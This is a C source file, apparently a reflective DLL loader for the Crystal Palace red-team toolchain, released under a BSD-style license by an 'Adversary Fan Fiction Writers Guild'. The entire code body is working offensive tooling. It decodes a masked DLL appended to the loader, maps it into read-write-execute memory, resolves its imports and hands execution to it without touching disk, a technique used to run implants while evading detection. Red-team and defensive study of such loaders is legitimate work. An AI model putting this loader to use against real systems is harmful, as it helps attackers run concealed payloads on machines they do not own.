/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

#define memset(x, y, z) __stosb((unsigned char *)x, y, z);
#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __DLLDATA__[0] __attribute__((section("my_data")));

/*
 * This is an empty function, but we will use redirect to LAYER recovery transforms over it.
 *
 * NOTE: gcc with -O1 likes to inline some functions and an empty or minimal function is a prime candidate for
 * inlining. I'm using noinline to prevent that tragedy, because if a function is inlined, we can't redirect it
 */
void __attribute__((noinline)) recover(_RESOURCE * rsrc) {
	/*
	 * And, in the fighting the optimizer department, -O1 likes to also not call a function it believes has
	 * no side-effects. So, we stick this here to say GCC LEAVE MY EMPTY FUNCTION ALONE!
	 */
	__asm__ __volatile__("");
}

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void go() {
	char       * dst;
	char       * src;
	DLLDATA      data;
	IMPORTFUNCS  funcs;
	_RESOURCE  * rsrc = (_RESOURCE *)__DLLDATA__;
	_RESOURCE  * rsrc_rw;

	/* allocate read/write memory for our encoded/masked DLL
	 *
	 * Note: we're using a generous 4MB buffer because with all of the different transforms you can chain
	 * together... it's hard to know the max size of each intermediate stage (compression modules threw this
	 * predictability out the window). */
	rsrc_rw = (_RESOURCE *)KERNEL32$VirtualAlloc(NULL, 4 * 1024 * 1024, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

	/* copy our encoded/masked DLL data to read/write memory. */
	memcpy(rsrc_rw, rsrc, rsrc->length + 4);

	/* apply our layered transforms (decoders) to recover our DLL data */
	recover(rsrc_rw);

	/* find our DLL appended to this PIC */
	src = (char *)rsrc_rw->value;

	/* parse our DLL! */
	ParseDLL(src, &data);

	/* allocate memory for it! */
	dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	/* load the damned thing */
	LoadDLL(&data, src, dst);

	/* setup our IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* process the imports */
	ProcessImports(&funcs, &data, dst);

	/* get our entry point */
	DLLMAIN_FUNC dllEntry = EntryPoint(&data, dst);

	/* we can free the intermediate decoded stage now */
	KERNEL32$VirtualFree(rsrc_rw, 0, MEM_RELEASE);

	/* pass execution to our DLL */
	dllEntry((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
}
